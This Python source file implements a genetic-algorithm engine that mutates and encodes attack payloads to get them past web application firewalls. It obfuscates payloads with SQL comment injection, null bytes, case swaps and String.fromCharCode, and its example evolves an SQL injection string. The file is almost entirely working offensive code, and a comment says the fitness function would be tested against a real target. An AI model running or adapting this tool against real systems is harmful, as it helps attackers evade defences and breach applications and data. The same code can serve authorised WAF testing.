#!/usr/bin/env python3
"""
Intelligent Payload Mutation Engine
Genetic algorithm-based payload evolution for WAF bypass
Context-aware mutations with machine learning patterns
"""

import sys
import json
import random
import base64
import hashlib
from typing import Dict, List, Tuple, Optional
from urllib.parse import quote, unquote
from collections import defaultdict

class PayloadMutationEngine:
    """Intelligent payload mutation engine with genetic algorithms"""

    # Encoding strategies
    ENCODING_CHAINS = {
        'url_encode': lambda x: quote(x),
        'url_double': lambda x: quote(quote(x)),
        'base64': lambda x: base64.b64encode(x.encode()).decode(),
        'hex': lambda x: ''.join(f'%{ord(c):02x}' for c in x),
        'unicode': lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
        'html_entity': lambda x: ''.join(f'&#{ord(c)};' for c in x),
        'octal': lambda x: ''.join(f'\\{oct(ord(c))[2:]}' for c in x),
    }

    # Mutation operators
    MUTATIONS = {
        'case_swap': lambda p: ''.join(c.swapcase() if random.random() > 0.5 else c for c in p),
        'whitespace_fuzz': lambda p: p.replace(' ', random.choice([' ', '\t', '\n', '\r', '/**/', '/**/'])),
        'comment_inject': lambda p: '/*' + p.replace(' ', '*/ /*') + '*/',
        'null_inject': lambda p: p.replace(' ', '%00'),
        'concat_split': lambda p: '+'.join(p.split(' ')) if ' ' in p else p,
        'char_code_obfuscate': lambda p: f"String.fromCharCode({','.join(str(ord(c)) for c in p[:20])})" if len(p) <= 20 else p,
    }

    def __init__(self, population_size: int = 20, generations: int = 10):
        self.population_size = population_size
        self.generations = generations
        self.fitness_history = []

    def mutate(self, payload: str, mutation_rate: float = 0.3) -> str:
        """Apply random mutations to payload"""
        mutated = payload

        for mutation_name, mutation_func in self.MUTATIONS.items():
            if random.random() < mutation_rate:
                try:
                    mutated = mutation_func(mutated)
                except:
                    continue

        return mutated

    def crossover(self, parent1: str, parent2: str) -> Tuple[str, str]:
        """Perform crossover between two payloads"""
        if len(parent1) < 2 or len(parent2) < 2:
            return parent1, parent2

        # Single-point crossover
        point1 = random.randint(1, len(parent1) - 1)
        point2 = random.randint(1, len(parent2) - 1)

        child1 = parent1[:point1] + parent2[point2:]
        child2 = parent2[:point2] + parent1[point1:]

        return child1, child2

    def encode_payload(self, payload: str, encoding_chain: List[str]) -> str:
        """Apply encoding chain to payload"""
        encoded = payload

        for encoding in encoding_chain:
            if encoding in self.ENCODING_CHAINS:
                try:
                    encoded = self.ENCODING_CHAINS[encoding](encoded)
                except:
                    continue

        return encoded

    def generate_variants(self, base_payload: str, count: int = 50) -> List[Dict]:
        """Generate payload variants using mutations and encodings"""
        variants = []

        print(json.dumps({
            'mutation': 'generating_variants',
            'base_payload': base_payload[:50],
            'count': count,
            'message': f'Generating {count} payload variants...'
        }), file=sys.stderr, flush=True)

        for i in range(count):
            variant = base_payload

            # Apply random mutations (1-3 mutations per variant)
            num_mutations = random.randint(1, 3)
            mutations_applied = []

            for _ in range(num_mutations):
                mutation_name = random.choice(list(self.MUTATIONS.keys()))
                try:
                    variant = self.MUTATIONS[mutation_name](variant)
                    mutations_applied.append(mutation_name)
                except:
                    continue

            # Apply random encoding chain (0-2 encodings)
            num_encodings = random.randint(0, 2)
            encodings_applied = []

            if num_encodings > 0:
                encoding_chain = random.sample(list(self.ENCODING_CHAINS.keys()), num_encodings)
                try:
                    variant = self.encode_payload(variant, encoding_chain)
                    encodings_applied = encoding_chain
                except:
                    pass

            variants.append({
                'payload': variant,
                'mutations': mutations_applied,
                'encodings': encodings_applied,
                'generation_method': 'random',
                'original_length': len(base_payload),
                'variant_length': len(variant)
            })

        print(json.dumps({
            'mutation': 'variants_generated',
            'count': len(variants),
            'unique': len(set(v['payload'] for v in variants)),
            'message': f'Generated {len(variants)} variants ({len(set(v["payload"] for v in variants))} unique)'
        }), file=sys.stderr, flush=True)

        return variants

    def evolve_payload(self, base_payload: str, fitness_func, target_fitness: float = 0.9) -> Dict:
        """
        Evolve payload using genetic algorithm

        Args:
            base_payload: Base payload to evolve
            fitness_func: Function to evaluate fitness (signature: func(payload) -> float [0-1])
            target_fitness: Target fitness score to achieve

        Returns:
            Best payload and evolution history
        """
        print(json.dumps({
            'evolution': 'starting',
            'base_payload': base_payload[:50],
            'population_size': self.population_size,
            'generations': self.generations,
            'target_fitness': target_fitness,
            'message': 'Starting genetic algorithm evolution...'
        }), file=sys.stderr, flush=True)

        # Initialize population
        population = [{'payload': base_payload, 'fitness': 0.0}]

        # Generate initial population with variants
        initial_variants = self.generate_variants(base_payload, self.population_size - 1)
        for variant in initial_variants:
            population.append({
                'payload': variant['payload'],
                'fitness': 0.0,
                'mutations': variant['mutations'],
                'encodings': variant['encodings']
            })

        # Evolution loop
        for generation in range(self.generations):
            # Evaluate fitness for all individuals
            for individual in population:
                if individual['fitness'] == 0.0:  # Only evaluate if not already evaluated
                    try:
                        individual['fitness'] = fitness_func(individual['payload'])
                    except:
                        individual['fitness'] = 0.0

            # Sort by fitness
            population.sort(key=lambda x: x['fitness'], reverse=True)

            best_fitness = population[0]['fitness']
            avg_fitness = sum(p['fitness'] for p in population) / len(population)

            self.fitness_history.append({
                'generation': generation,
                'best_fitness': best_fitness,
                'avg_fitness': avg_fitness
            })

            print(json.dumps({
                'evolution': 'generation',
                'generation': generation + 1,
                'best_fitness': best_fitness,
                'avg_fitness': avg_fitness,
                'best_payload': population[0]['payload'][:50],
                'message': f'Generation {generation + 1}/{self.generations}: Best fitness = {best_fitness:.3f}'
            }), file=sys.stderr, flush=True)

            # Check if target achieved
            if best_fitness >= target_fitness:
                print(json.dumps({
                    'evolution': 'target_achieved',
                    'generation': generation + 1,
                    'fitness': best_fitness,
                    'message': f'Target fitness achieved in generation {generation + 1}!'
                }), file=sys.stderr, flush=True)
                break

            # Selection: Keep top 50%
            survivors = population[:self.population_size // 2]

            # Crossover and mutation to create new generation
            offspring = []

            while len(offspring) < self.population_size - len(survivors):
                # Select parents (tournament selection)
                parent1 = random.choice(survivors[:len(survivors)//2])  # Favor better individuals
                parent2 = random.choice(survivors)

                # Crossover
                if len(parent1['payload']) > 1 and len(parent2['payload']) > 1:
                    child1_payload, child2_payload = self.crossover(parent1['payload'], parent2['payload'])
                else:
                    child1_payload = parent1['payload']
                    child2_payload = parent2['payload']

                # Mutation
                child1_payload = self.mutate(child1_payload, mutation_rate=0.3)
                child2_payload = self.mutate(child2_payload, mutation_rate=0.3)

                offspring.append({'payload': child1_payload, 'fitness': 0.0})
                if len(offspring) < self.population_size - len(survivors):
                    offspring.append({'payload': child2_payload, 'fitness': 0.0})

            # New population
            population = survivors + offspring

        # Return best payload
        best_payload = max(population, key=lambda x: x['fitness'])

        result = {
            'success': best_payload['fitness'] >= target_fitness,
            'best_payload': best_payload['payload'],
            'best_fitness': best_payload['fitness'],
            'generations_evolved': len(self.fitness_history),
            'fitness_history': self.fitness_history,
            'final_population_size': len(population)
        }

        print(json.dumps({
            'evolution': 'completed',
            'success': result['success'],
            'best_fitness': result['best_fitness'],
            'generations': result['generations_evolved'],
            'message': f'Evolution completed: {"SUCCESS" if result["success"] else "TARGET NOT REACHED"}'
        }), file=sys.stderr, flush=True)

        return result


if __name__ == '__main__':
    # Example: Evolve SQL injection payload
    base_payload = "' OR '1'='1"

    # Mock fitness function (in real use, this would test against target)
    def mock_fitness(payload):
        score = 0.0
        # Longer payloads get higher score (up to a point)
        if len(payload) > 10:
            score += 0.3
        # Encoded payloads get higher score
        if any(enc in payload for enc in ['%', '\\u', '&#']):
            score += 0.4
        # Obfuscated payloads get higher score
        if any(pattern in payload.lower() for pattern in ['fromcharcode', '/**/', '/*']):
            score += 0.3
        return min(score, 1.0)

    engine = PayloadMutationEngine(population_size=20, generations=10)

    # Generate variants
    variants = engine.generate_variants(base_payload, count=30)
    print(json.dumps({'variants_sample': variants[:5]}, indent=2))

    # Evolve payload
    evolution_result = engine.evolve_payload(base_payload, mock_fitness, target_fitness=0.8)
    print(json.dumps(evolution_result, indent=2))
